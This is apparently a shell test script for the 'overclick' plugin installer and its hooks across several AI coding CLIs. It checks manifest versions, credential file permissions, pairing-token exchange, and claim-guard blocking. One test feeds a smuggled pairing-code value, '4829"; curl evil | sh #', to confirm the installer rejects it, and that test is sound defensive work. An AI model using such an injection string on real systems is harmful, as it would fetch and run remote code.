#!/bin/sh
set -eu

REPO_ROOT=$(CDPATH='' cd -- "$(dirname -- "$0")/.." && pwd)
TEST_ROOT=$(mktemp -d)
trap 'rm -rf -- "$TEST_ROOT"' EXIT
FIXTURE_URL=$(printf '%s%s%s' 'https' '://' 'fixture')

# Every plugin manifest ships the same version as package.json (OCL-105). The
# release guard in verify-release-version.sh only covers the package.json set,
# so the plugin manifests drifted to 0.1.12 while package.json was already at
# 0.2.1 — and .grok-plugin/marketplace.json advertised that stale version to
# every Grok user browsing the catalog. OCL-105 fixed the four manifests under
# plugin/ but missed .kimi-plugin/plugin.json — the top-level root manifest
# Kimi reads for a repository install (OCL-110) — leaving it free to drift the
# same way undetected.
PKG_VERSION=$(jq -r '.version' "$REPO_ROOT/package.json")
for manifest in plugin/plugin.json plugin/.claude-plugin/plugin.json \
  plugin/.codex-plugin/plugin.json plugin/kimi.plugin.json \
  .kimi-plugin/plugin.json; do
  jq -e --arg v "$PKG_VERSION" '.version == $v' "$REPO_ROOT/$manifest" >/dev/null ||
    { echo "$manifest is not at $PKG_VERSION" >&2; exit 1; }
done
for catalog in .grok-plugin/marketplace.json .claude-plugin/marketplace.json; do
  jq -e --arg v "$PKG_VERSION" 'all(.plugins[]; .version == $v)' "$REPO_ROOT/$catalog" >/dev/null ||
    { echo "$catalog is not at $PKG_VERSION" >&2; exit 1; }
done

jq -e '.skills and .mcpServers and (has("hooks") | not) and (has("commands") | not)' \
  "$REPO_ROOT/plugin/.codex-plugin/plugin.json" >/dev/null
jq -e '.skills and (.hooks | length == 6) and .commands' \
  "$REPO_ROOT/plugin/kimi.plugin.json" >/dev/null

# OCL-114. The package ships NO MCP server. A `${OVERCLICK_URL}` placeholder is
# never expanded by the CLIs, so every marketplace install used to hand the user
# an `overclick` server that could not connect - and, on a machine where a run
# had baked a fixture instance into these files, one that pointed at a host that
# does not exist. install.sh writes the resolved server into each CLI's own
# configuration instead, so the only thing the package can contribute is nothing.
for template in plugin/.mcp.json plugin/mcp_config.json plugin/.codex-plugin/mcp.json; do
  jq -e '.mcpServers | length == 0' "$REPO_ROOT/$template" >/dev/null ||
    { echo "$template must ship no MCP server" >&2; exit 1; }
done
jq -e 'has("mcpServers") | not' "$REPO_ROOT/plugin/kimi.plugin.json" >/dev/null
if grep -rq 'OVERCLICK_URL' "$REPO_ROOT/plugin"; then
  echo "the package still carries an unexpandable OVERCLICK_URL placeholder" >&2
  exit 1
fi
# Kimi finds a plugin root only in an archive root or a single child directory, so a
# repository install needs a root manifest pointing into ./plugin/. It carries no
# mcpServers: a registry install cannot know the instance URL, and Kimi drops an
# unresolvable url silently.
jq -e '(.skills | index("./plugin/skills/overclick")) and .commands == "./plugin/commands"
  and (.hooks | length == 6) and (.hooks | all(.command | startswith("./plugin/hooks/")))
  and (has("mcpServers") | not)' \
  "$REPO_ROOT/.kimi-plugin/plugin.json" >/dev/null
jq -e '.hooks | keys | sort == ["PostToolUse", "PreToolUse", "SessionStart", "Stop"]' \
  "$REPO_ROOT/plugin/hooks/hooks.json" >/dev/null
jq -e '(.hooks.PostToolUse | length == 2) and (.hooks.PreToolUse | length == 2)' \
  "$REPO_ROOT/plugin/hooks/hooks.json" >/dev/null
test -x "$REPO_ROOT/plugin/hooks/claim-guard.sh"
test "$(find "$REPO_ROOT/plugin/commands" -name '*.md' | wc -l | tr -d ' ')" -eq 5
test "$(find "$REPO_ROOT/plugin/skills" -name SKILL.md | wc -l | tr -d ' ')" -eq 1

# `stat -f` means "file mode" on BSD/macOS but "filesystem status" on GNU
# coreutils — where it SUCCEEDS and prints a multi-line filesystem block, so a
# `stat -f ... || stat -c ...` fallback never reaches the GNU form and `test`
# aborts with "Illegal number" (exit 2). Probe the GNU flag first: it is the one
# that fails cleanly on the other platform.
file_mode() {
  stat -c '%a' "$1" 2>/dev/null || stat -f '%Lp' "$1"
}

mkdir -p "$TEST_ROOT/bin" "$TEST_ROOT/home/.codex" "$TEST_ROOT/project" "$TEST_ROOT/claude-cache" "$TEST_ROOT/codex-cache"
touch "$TEST_ROOT/claude-cache/OVERCLICK.md"
touch "$TEST_ROOT/codex-cache/OVERCLICK.md"
# OCL-104 gave install.sh a `codex plugin list --json` materialization check to
# match the Claude one, but this stub only ever answered for claude, so codex
# verification saw empty output, install.sh exited 1, and this whole suite
# failed. Each CLI that install.sh verifies needs an answer here — its own
# shape: claude returns a flat array with installPath, codex an {installed: []}
# whose entries carry source.path.
cat >"$TEST_ROOT/bin/agent-stub" <<'SH'
#!/bin/sh
printf '%s:%s:%s\n' "$(basename -- "$0")" "${1:-}" "${2:-}" >>"$OC_TEST_NATIVE_LOG"
# The native managers resolve their own user scope from HOME, so what HOME was
# when they ran is the whole question a sandboxed install has to answer.
printf 'home:%s\n' "${HOME:-}" >>"$OC_TEST_NATIVE_LOG"
# `claude mcp add` and `grok mcp add` declare `-H, --header <header...>`, a
# VARIADIC option: it consumes every following argument that is not itself an
# option. Put the name and the URL after it and they become header values, and
# the command dies on "missing required argument 'name'" - which quiet_try
# reports as a step to confirm by hand, so the failure reads like a warning
# (OCL-114). Parse the way commander does, so the ordering stays under test.
if [ "${1:-}" = "mcp" ] && [ "${2:-}" = "add" ]; then
  shift 2
  positionals=0
  collecting=0
  url=""
  for argument in "$@"; do
    case "$argument" in
      --header|-H) collecting=1; continue ;;
      --transport|--scope|-s) collecting=0; skip_value=1; continue ;;
      -*) collecting=0; continue ;;
    esac
    if [ "${skip_value:-0}" = "1" ]; then skip_value=0; continue; fi
    if [ "$collecting" = "1" ]; then continue; fi
    positionals=$((positionals + 1))
    case "$argument" in http://*|https://*) url=$argument ;; esac
  done
  if [ "$positionals" -lt 2 ]; then
    echo "error: missing required argument 'name'" >&2
    exit 1
  fi
  printf 'mcp-url:%s\n' "$url" >>"$OC_TEST_NATIVE_LOG"
  exit 0
fi
# A board somebody already configured under this name. The real CLIs print the
# server they hold; an absent one is empty output here and a non-zero exit there.
if [ "${1:-}" = "mcp" ] && [ "${2:-}" = "get" ]; then
  [ -n "${OC_TEST_EXISTING_MCP:-}" ] && printf 'overclick: %s (HTTP)\n' "$OC_TEST_EXISTING_MCP"
fi
if [ "${1:-}" = "plugin" ] && [ "${2:-}" = "list" ]; then
  case "$(basename -- "$0")" in
    claude)
      printf '[{"id":"overclick@overclick","enabled":true,"installPath":"%s"}]' "$OC_TEST_CLAUDE_CACHE"
      ;;
    # OCL-104 gave Codex the same "ask the CLI what it holds" check Claude has,
    # in its own listing shape. Without an answer here the stub reports an
    # install that never materialized and the whole suite fails on that.
    codex)
      printf '{"installed":[{"name":"overclick","installed":true,"enabled":true,"source":{"path":"%s"}}]}' "$OC_TEST_CODEX_CACHE"
      ;;
  esac
fi
exit 0
SH
chmod +x "$TEST_ROOT/bin/agent-stub"
for cli in claude codex grok kimi; do
  ln -s agent-stub "$TEST_ROOT/bin/$cli"
done

# Antigravity's manager copies the directory it is handed into
# ~/.gemini/config/plugins/<name>, and install.sh then re-checks the mode of the
# credentials that landed in that second copy. A stub that only exits 0 would
# leave both the copy and that check untested, so it copies like the real one.
cat >"$TEST_ROOT/bin/agy" <<'SH'
#!/bin/sh
printf '%s:%s:%s\n' agy "${1:-}" "${2:-}" >>"$OC_TEST_NATIVE_LOG"
plugins="$OVERCLICK_INSTALL_HOME/.gemini/config/plugins"
case "${1:-}:${2:-}" in
  plugin:install)
    mkdir -p "$plugins/overclick"
    cp -R "$3/." "$plugins/overclick/"
    ;;
  plugin:list)
    [ -d "$plugins/overclick" ] && printf '{"imports":[{"name":"overclick","source":"antigravity"}]}'
    ;;
esac
exit 0
SH
chmod +x "$TEST_ROOT/bin/agy"

cat >"$TEST_ROOT/home/.codex/hooks.json" <<'JSON'
{
  "hooks": {
    "SessionStart": [
      {
        "matcher": "startup",
        "hooks": [{ "type": "command", "command": "existing-hook" }]
      }
    ]
  }
}
JSON

run_installer() {
  PATH="$TEST_ROOT/bin:$PATH" \
  OC_TEST_NATIVE_LOG="$TEST_ROOT/native.log" \
  OC_TEST_CLAUDE_CACHE="$TEST_ROOT/claude-cache" \
  OC_TEST_CODEX_CACHE="$TEST_ROOT/codex-cache" \
  OVERCLICK_INSTALL_HOME="$TEST_ROOT/home" \
  OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
  OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
  OVERCLICK_TOKEN="fixture" \
  OVERCLICK_CLIS="claude,codex,grok,kimi,agy" \
    "$REPO_ROOT/install.sh" >"$TEST_ROOT/install.out" 2>"$TEST_ROOT/install.err"
}

run_installer
run_installer

if grep -q 'fixture' "$TEST_ROOT/install.out" "$TEST_ROOT/install.err"; then
  echo "installer exposed private input" >&2
  exit 1
fi

test "$(grep -c '<!-- overclick:start -->' "$TEST_ROOT/home/.claude/CLAUDE.md")" -eq 1
test "$(grep -c '^# overclick:start$' "$TEST_ROOT/home/.codex/config.toml")" -eq 1
test "$(grep -c 'existing-hook' "$TEST_ROOT/home/.codex/hooks.json")" -eq 1
test "$(grep -c 'session-start.sh' "$TEST_ROOT/home/.codex/hooks.json")" -eq 1
test "$(grep -c 'claim-guard.sh' "$TEST_ROOT/home/.codex/hooks.json" || true)" -eq 0
test "$(grep -c '^enforce_claim=0$' "$TEST_ROOT/home/.config/overclick/config")" -eq 1
test "$(grep -c '^token=' "$TEST_ROOT/home/.config/overclick/config")" -eq 1
test "$(file_mode "$TEST_ROOT/home/.config/overclick/config")" -eq 600

# Kimi has no non-interactive plugin subcommand, so install.sh writes its registry
# directly. Running twice must leave exactly one entry, and the installed copy must
# carry a resolved url: Kimi validates it and silently drops the server otherwise.
test "$(jq -r '[.plugins[] | select(.id == "overclick")] | length' \
  "$TEST_ROOT/home/.kimi-code/plugins/installed.json")" -eq 1
jq -e 'has("mcpServers") | not' \
  "$TEST_ROOT/home/.kimi-code/plugins/managed/overclick/kimi.plugin.json" >/dev/null
# Kimi discriminates MCP transports on "transport"; a "type" key is dropped and the
# transport re-inferred from the url, so declaring it is working by accident.
jq -e --arg url "$FIXTURE_URL/mcp" '.mcpServers.overclick.transport == "http"
  and .mcpServers.overclick.url == $url
  and (.mcpServers.overclick | has("type") | not)' \
  "$TEST_ROOT/home/.kimi-code/mcp.json" >/dev/null
test -x "$TEST_ROOT/home/.kimi-code/plugins/managed/overclick/hooks/claim-guard.sh"

# Antigravity gets the package through its own manager, so what has to hold is
# what the manager ends up holding: the MCP shape it actually parses
# (serverUrl + headers, no "type"), a resolved url rather than the repository
# template, the rule pointing at the OVERCLICK.md that exists on disk, and a
# second copy of the credentials that is no more readable than the first.
agy_plugin="$TEST_ROOT/home/.gemini/config/plugins/overclick"
jq -e '(.mcpServers.overclick.serverUrl | startswith("$") | not)
  and .mcpServers.overclick.headers.Authorization
  and (.mcpServers.overclick | has("type") | not)' \
  "$agy_plugin/mcp_config.json" >/dev/null
test "$(file_mode "$agy_plugin/mcp_config.json")" -eq 600
test "$(grep -c '<!-- overclick:start -->' "$agy_plugin/rules/AGENTS.md")" -eq 1
grep -Fq "$agy_plugin/OVERCLICK.md" "$agy_plugin/rules/AGENTS.md"
test -f "$agy_plugin/OVERCLICK.md"
test -x "$agy_plugin/hooks/antigravity.sh"
jq -e '.overclick | (.PreToolUse | length == 2) and (.PostToolUse | length == 1)
  and .PreInvocation and .Stop' "$agy_plugin/hooks.json" >/dev/null
# The repository package stays a generic template: only the installed copy is
# allowed to carry an instance.
jq -e '.mcpServers | length == 0' "$REPO_ROOT/plugin/mcp_config.json" >/dev/null

# OCL-114: every copy the installer leaves behind, other than the Antigravity
# one above and each CLI's own config, must be free of a server entry - so no
# CLI can end up with two `overclick` servers, and no dead one can survive in a
# marketplace directory after the instance it was baked from is gone.
for copy in \
  "$TEST_ROOT/home/.config/overclick/plugin" \
  "$TEST_ROOT/home/.config/overclick/native-marketplace/plugin" \
  "$TEST_ROOT/home/.config/overclick/codex-marketplace/plugins/overclick"; do
  jq -e '.mcpServers | length == 0' "$copy/.mcp.json" >/dev/null ||
    { echo "$copy/.mcp.json declares a duplicate MCP server" >&2; exit 1; }
  jq -e 'has("mcpServers") | not' "$copy/kimi.plugin.json" >/dev/null ||
    { echo "$copy/kimi.plugin.json declares a duplicate MCP server" >&2; exit 1; }
  if grep -Rq 'fixture' "$copy/.mcp.json" "$copy/kimi.plugin.json"; then
    echo "$copy still carries baked credentials" >&2
    exit 1
  fi
done

# The one registration Claude gets has to be the resolved instance, and it has
# to be written through Claude's own manager rather than into the package.
grep -Fq "mcp-url:$FIXTURE_URL/mcp" "$TEST_ROOT/native.log"
# quiet_try turns a failed registration into a line that reads like advice, so
# the absence of that line is the only thing that says the server was really
# registered.
if grep -Fq 'Claude MCP needs manual confirmation' "$TEST_ROOT/install.err"; then
  echo "the Claude MCP registration failed" >&2
  exit 1
fi
grep -Fq 'Claude MCP configured.' "$TEST_ROOT/install.out"
# A sandboxed install must not reach the operator's real configuration: the
# native managers resolve their user scope from HOME, so HOME has to follow
# OVERCLICK_INSTALL_HOME (OCL-114).
grep -Fq "home:$TEST_ROOT/home" "$TEST_ROOT/native.log"

# A PreToolUse hook that answers with an empty object is read by Antigravity as
# a denial, so the adapter has to speak on every path — including the one where
# there is no JSON runtime to read the payload with at all. That branch is only
# reachable with python3 and node off PATH, which is why it gets its own PATH.
mkdir -p "$TEST_ROOT/nojson"
for utility in sh grep sed tr cat dirname printf git; do
  target=$(command -v "$utility" 2>/dev/null) && ln -sf "$target" "$TEST_ROOT/nojson/$utility"
done
agy_hook() { (cd "$agy_plugin" && printf '%s' "$3" | PATH="$1" sh ./hooks/antigravity.sh "$2"); }
for agy_path in "$PATH" "$TEST_ROOT/nojson"; do
  printf '%s' "$(agy_hook "$agy_path" pre-tool 'not json')" | grep -Fq '"decision":'
  printf '%s' "$(agy_hook "$agy_path" pre-tool '{"toolCall":{"name":"run_command","args":{"CommandLine":"ls"}}}')" |
    grep -Fq '"decision":"allow"'
done
printf '%s' "$(agy_hook "$PATH" pre-invocation '{"invocationNum":3}')" | grep -Fq '{}'

sed -i.bak 's/enforce_claim=0/enforce_claim=1/' "$TEST_ROOT/home/.config/overclick/config"
run_installer
test "$(grep -c '^enforce_claim=1$' "$TEST_ROOT/home/.config/overclick/config")" -eq 1

# "Successfully installed" is not proof of anything: a marketplace entry that
# never fetched its package still exits 0. The installer must ask the CLI
# what it actually has on disk and fail loudly when that comes up empty.
mkdir -p "$TEST_ROOT/claude-cache-empty"
if PATH="$TEST_ROOT/bin:$PATH" \
  OC_TEST_NATIVE_LOG="$TEST_ROOT/native-unverified.log" \
  OC_TEST_CLAUDE_CACHE="$TEST_ROOT/claude-cache-empty" \
  OC_TEST_CODEX_CACHE="$TEST_ROOT/codex-cache" \
  OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-unverified" \
  OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
  OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
  OVERCLICK_TOKEN="fixture" \
  OVERCLICK_CLIS="claude" \
    "$REPO_ROOT/install.sh" >"$TEST_ROOT/unverified.out" 2>"$TEST_ROOT/unverified.err"; then
  echo "installer should fail loudly when the Claude plugin never materializes" >&2
  exit 1
fi
grep -Fq 'did not materialize' "$TEST_ROOT/unverified.err"

# `curl | bash` never gives install.sh a local checkout to reuse (OCL-103: the
# github source was never the bug). Exercise that path directly: a bare install.sh copy, no plugin/ next
# to it, sourcing a local git remote instead of network github.
mkdir -p "$TEST_ROOT/plugin-remote/plugin/.codex-plugin" \
  "$TEST_ROOT/plugin-remote/.claude-plugin" "$TEST_ROOT/plugin-remote/.grok-plugin"
git init -q "$TEST_ROOT/plugin-remote"
git -C "$TEST_ROOT/plugin-remote" config user.name fixture
git -C "$TEST_ROOT/plugin-remote" config user.email fixture@invalid
printf 'package v1\n' >"$TEST_ROOT/plugin-remote/plugin/OVERCLICK.md"
printf '{}' >"$TEST_ROOT/plugin-remote/plugin/.codex-plugin/plugin.json"
printf '{}' >"$TEST_ROOT/plugin-remote/.claude-plugin/marketplace.json"
printf '{}' >"$TEST_ROOT/plugin-remote/.grok-plugin/marketplace.json"
git -C "$TEST_ROOT/plugin-remote" add -A
git -C "$TEST_ROOT/plugin-remote" commit -q -m v1

mkdir -p "$TEST_ROOT/isolated-installer" "$TEST_ROOT/clone-cache"
cp "$REPO_ROOT/install.sh" "$TEST_ROOT/isolated-installer/install.sh"
chmod +x "$TEST_ROOT/isolated-installer/install.sh"
touch "$TEST_ROOT/clone-cache/OVERCLICK.md"

run_clone_installer() {
  PATH="$TEST_ROOT/bin:$PATH" \
  OC_TEST_NATIVE_LOG="$TEST_ROOT/clone-native.log" \
  OC_TEST_CLAUDE_CACHE="$TEST_ROOT/clone-cache" \
  OC_TEST_CODEX_CACHE="$TEST_ROOT/codex-cache" \
  OVERCLICK_INSTALL_HOME="$TEST_ROOT/clone-home" \
  OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
  OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
  OVERCLICK_TOKEN="fixture" \
  OVERCLICK_CLIS="claude" \
  OVERCLICK_PLUGIN_SOURCE="file://$TEST_ROOT/plugin-remote" \
    "$TEST_ROOT/isolated-installer/install.sh" >"$TEST_ROOT/clone.out" 2>"$TEST_ROOT/clone.err"
}

run_clone_installer
plugin_src="$TEST_ROOT/clone-home/.config/overclick/plugin-src"
test -d "$plugin_src/.git"
grep -Fq 'package v1' "$plugin_src/plugin/OVERCLICK.md"

printf 'package v2\n' >"$TEST_ROOT/plugin-remote/plugin/OVERCLICK.md"
git -C "$TEST_ROOT/plugin-remote" add -A
git -C "$TEST_ROOT/plugin-remote" commit -q -m v2

run_clone_installer
grep -Fq 'package v2' "$plugin_src/plugin/OVERCLICK.md"

OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-fallback" \
OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
OVERCLICK_TOKEN="fixture" \
OVERCLICK_CLIS="other" \
  "$REPO_ROOT/install.sh" >"$TEST_ROOT/fallback.out" 2>"$TEST_ROOT/fallback.err"
OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-fallback" \
OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
OVERCLICK_TOKEN="fixture" \
OVERCLICK_CLIS="other" \
  "$REPO_ROOT/install.sh" >"$TEST_ROOT/fallback.out" 2>"$TEST_ROOT/fallback.err"
test "$(grep -c '<!-- overclick:start -->' "$TEST_ROOT/project/AGENTS.md")" -eq 1

# A pairing code, not a token (OCL-102). The board prints six digits inside the
# copyable command and the installer trades them on /api/pair for the real
# bearer value, so nothing anyone can read off a shared screen is worth having.
# The stub answers the way the route does; what is under test is that the token
# reaches the private config and reaches no output.
mkdir -p "$TEST_ROOT/pair-bin"
cat >"$TEST_ROOT/pair-bin/curl" <<'SH'
#!/bin/sh
# exchange_pairing_code now calls `curl -sS -o <file> -w '%{http_code}'`: the
# body lands in the -o file and only the HTTP status is on stdout. Emulate that
# contract, not the old "print the body on stdout" one, or the exchange reads
# the JSON as a status, falls to the refusal branch, and the install exits 1.
url=""
body=""
out=""
previous=""
for argument in "$@"; do
  case "$argument" in
    http://*|https://*) url=$argument ;;
  esac
  case "$previous" in
    -d) body=$argument ;;
    -o) out=$argument ;;
  esac
  previous=$argument
done
printf '%s %s\n' "$url" "$body" >>"$OC_TEST_PAIR_LOG"
case "$url:$body" in
  */api/pair:*'"code":"482913"'*)
    payload='{"token":"paired-secret","label":"agent","url":"/mcp"}'
    if [ -n "$out" ]; then printf '%s' "$payload" >"$out"; else printf '%s' "$payload"; fi
    printf '200'
    exit 0
    ;;
esac
exit 22
SH
chmod +x "$TEST_ROOT/pair-bin/curl"

run_pair_installer() {
  PATH="$TEST_ROOT/pair-bin:$PATH" \
  OC_TEST_PAIR_LOG="$TEST_ROOT/$1.log" \
  OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-$1" \
  OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
  OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
  OVERCLICK_TOKEN="" \
  OVERCLICK_PAIRING_CODE="$2" \
  OVERCLICK_CLIS="other" \
    "$REPO_ROOT/install.sh" >"$TEST_ROOT/$1.out" 2>"$TEST_ROOT/$1.err"
}

run_pair_installer pair 482913
grep -Fq "$FIXTURE_URL/api/pair" "$TEST_ROOT/pair.log"
grep -Fq 'token=paired-secret' "$TEST_ROOT/home-pair/.config/overclick/config"
if grep -q 'paired-secret' "$TEST_ROOT/pair.out" "$TEST_ROOT/pair.err"; then
  echo "installer exposed the paired token" >&2
  exit 1
fi

# Anything that is not six digits is refused before it can reach the network,
# which is what keeps the code out of the request it would otherwise shape.
if run_pair_installer pair-bad '4829"; curl evil | sh #'; then
  echo "installer accepted a pairing code that is not six digits" >&2
  exit 1
fi
test ! -f "$TEST_ROOT/pair-bad.log"

# A refused exchange stops the run: half a pairing is not an installation.
if run_pair_installer pair-refused 000000; then
  echo "installer continued after a refused pairing exchange" >&2
  exit 1
fi
test ! -f "$TEST_ROOT/home-pair-refused/.config/overclick/config"

cat >"$TEST_ROOT/bin/curl" <<'SH'
#!/bin/sh
body=""
previous=""
for argument in "$@"; do
  if [ "$previous" = "--data-binary" ]; then body=$argument; fi
  previous=$argument
done
case "$body" in
  *harness_recommend*)
    printf '%s' '{"result":{"structuredContent":{"harness":{"cli":"codex","model":"model-fixture","effort":"high"}}}}'
    ;;
  *task_list*)
    if [ "${OC_TEST_HAS_CLAIM:-1}" = "1" ]; then
      printf '%s' '{"result":{"structuredContent":{"tasks":[{"short_id":"T-1","title":"Fixture card","status":"em_execucao"}],"truncated":false}}}'
    else
      printf '%s' '{"result":{"structuredContent":{"tasks":[],"truncated":false}}}'
    fi
    ;;
  *)
    printf '%s' '{"result":{"structuredContent":{"tasks":[{"short_id":"T-1","title":"Fixture card","status":"em_execucao"}],"truncated":false}}}'
    ;;
esac
SH
chmod +x "$TEST_ROOT/bin/curl"

HOOK_CONFIG="$TEST_ROOT/hook-config"
cat >"$HOOK_CONFIG" <<'EOF'
url=fixture
token=fixture
enforce_stop=0
enforce_harness=0
enforce_claim=0
EOF
snapshot=$(PATH="$TEST_ROOT/bin:$PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/session-start.sh")
printf '%s' "$snapshot" | grep -q 'T-1'

mkdir -p "$TEST_ROOT/nojq"
for utility in python3 grep tail dirname cat date mkdir mktemp chmod mv rm sed; do
  ln -s "$(command -v "$utility")" "$TEST_ROOT/nojq/$utility"
done
ln -s "$TEST_ROOT/bin/curl" "$TEST_ROOT/nojq/curl"
python_snapshot=$(PATH="$TEST_ROOT/nojq" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/session-start.sh")
printf '%s' "$python_snapshot" | grep -q 'T-1'

mkdir -p "$TEST_ROOT/nojq-node"
for utility in node grep tail dirname cat date mkdir mktemp chmod mv rm sed; do
  ln -s "$(command -v "$utility")" "$TEST_ROOT/nojq-node/$utility"
done
ln -s "$TEST_ROOT/bin/curl" "$TEST_ROOT/nojq-node/curl"

test -z "$(PATH="$TEST_ROOT/bin:$PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/stop-guard.sh")"
sed -i.bak 's/enforce_stop=0/enforce_stop=1/' "$HOOK_CONFIG"
stop_result=$(PATH="$TEST_ROOT/bin:$PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/stop-guard.sh")
printf '%s' "$stop_result" | grep -q '"decision":"block"'

sed -i.bak 's/enforce_harness=0/enforce_harness=1/' "$HOOK_CONFIG"
matching_input='{"tool_input":{"type":"feature","harness":{"cli":"codex","model":"model-fixture","effort":"high"}}}'
test -z "$(printf '%s' "$matching_input" | PATH="$TEST_ROOT/bin:$PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/pre-create.sh")"
mismatched_input='{"tool_input":{"type":"feature","harness":{"cli":"codex","model":"other-model","effort":"high"}}}'
pre_result=$(printf '%s' "$mismatched_input" | PATH="$TEST_ROOT/bin:$PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/pre-create.sh")
printf '%s' "$pre_result" | grep -q '"decision":"block"'

write_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"session-fixture",tool_name:"Write",tool_input:{file_path:"changed.txt",content:"fixture"}}')
test -z "$(printf '%s' "$write_input" | PATH="$TEST_ROOT/bin:$PATH" OC_TEST_HAS_CLAIM=0 OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh")"

sed -i.bak 's/enforce_claim=0/enforce_claim=1/' "$HOOK_CONFIG"
blocked_write=$(printf '%s' "$write_input" | PATH="$TEST_ROOT/bin:$PATH" OC_TEST_HAS_CLAIM=0 OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh")
printf '%s' "$blocked_write" | grep -Fq 'claima um card no board antes: task_claim {id}'

read_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"session-fixture",tool_name:"Bash",tool_input:{command:"git status --short"}}')
test -z "$(printf '%s' "$read_input" | PATH="$TEST_ROOT/bin:$PATH" OC_TEST_HAS_CLAIM=0 OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh")"
write_bash_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"session-fixture",tool_name:"Bash",tool_input:{command:"printf fixture > changed.txt"}}')
blocked_bash=$(printf '%s' "$write_bash_input" | PATH="$TEST_ROOT/bin:$PATH" OC_TEST_HAS_CLAIM=0 OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh")
printf '%s' "$blocked_bash" | grep -Fq 'claima um card no board antes: task_claim {id}'

failed_claim_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"session-fixture",tool_name:"task_claim",tool_input:{task_id:"T-1"},tool_response:{isError:true,content:[{type:"text",text:"claim failed"}]}}')
printf '%s' "$failed_claim_input" | PATH="$TEST_ROOT/bin:$PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh"
test ! -e "$TEST_ROOT/project/.overclick/claim.json"

claim_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"session-fixture",tool_name:"mcp__overclick__task_claim",tool_input:{task_id:"T-1"},tool_response:{structuredContent:{task:{short_id:"T-1",status:"em_execucao"},attempt:{id:"attempt-fixture",started_at:"2026-08-19T12:00:00.000Z"}}}}')
printf '%s' "$claim_input" | PATH="$TEST_ROOT/bin:$PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh"
test -f "$TEST_ROOT/project/.overclick/claim.json"
test "$(file_mode "$TEST_ROOT/project/.overclick/claim.json")" -eq 600
jq -e '.task_id == "T-1" and .claimed_at == "2026-08-19T12:00:00.000Z" and .session_id == "session-fixture"' "$TEST_ROOT/project/.overclick/claim.json" >/dev/null
test -z "$(printf '%s' "$write_input" | PATH="$TEST_ROOT/bin:$PATH" OC_TEST_HAS_CLAIM=0 OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh")"
other_session_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"another-session",tool_name:"Write",tool_input:{file_path:"changed.txt",content:"fixture"}}')
blocked_other_session=$(printf '%s' "$other_session_input" | PATH="$TEST_ROOT/bin:$PATH" OC_TEST_HAS_CLAIM=0 OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh")
printf '%s' "$blocked_other_session" | grep -Fq 'claima um card no board antes: task_claim {id}'

deliver_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"session-fixture",tool_name:"mcp__overclick__task_deliver",tool_input:{task_id:"T-1"}}')
printf '%s' "$deliver_input" | PATH="$TEST_ROOT/bin:$PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh"
test ! -e "$TEST_ROOT/project/.overclick/claim.json"
blocked_after_deliver=$(printf '%s' "$write_input" | PATH="$TEST_ROOT/bin:$PATH" OC_TEST_HAS_CLAIM=0 OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh")
printf '%s' "$blocked_after_deliver" | grep -Fq 'claima um card no board antes: task_claim {id}'

test -z "$(printf '%s' "$write_input" | PATH="$TEST_ROOT/bin:$PATH" OC_TEST_HAS_CLAIM=1 OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh")"

printf '%s' "$claim_input" | PATH="$TEST_ROOT/bin:$PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$REPO_ROOT/plugin/hooks/claim-guard.sh"
release_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"session-fixture",tool_name:"task_release",tool_input:{task_id:"T-1"}}')
